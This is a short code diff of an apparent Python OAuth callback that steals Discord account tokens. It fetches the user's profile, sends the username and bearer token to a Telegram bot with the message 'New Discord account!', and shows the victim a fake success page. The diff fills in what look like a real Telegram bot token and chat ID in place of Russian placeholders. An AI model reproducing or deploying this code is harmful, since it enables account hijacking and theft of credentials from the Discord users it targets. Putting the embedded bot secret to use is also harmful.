@@ -13,9 +13,9 @@ def callback():
                           headers={'Authorization': f'Bearer {token}'}).json()
         
         # Отправляем в Telegram
-        telegram_url = f"https://api.telegram.org/botТВОЙ_ТОКЕН/sendMessage"
+        telegram_url = f"https://api.telegram.org/bot8397924025:AAFFE395imJAJfq72EnXg8rVUF5Z0CzcZbU/sendMessage"
         message = f"🎯 New Discord account!\nUser: {user['username']}\nToken: {token}"
-        requests.post(telegram_url, json={'chat_id': 'ТВОЙ_ID', 'text': message})
+        requests.post(telegram_url, json={'chat_id': '7742974651', 'text': message})
         
         # Показываем "успех"
         return '''
@@ -25,3 +25,4 @@ def callback():
         '''
     
     return "Error"
+
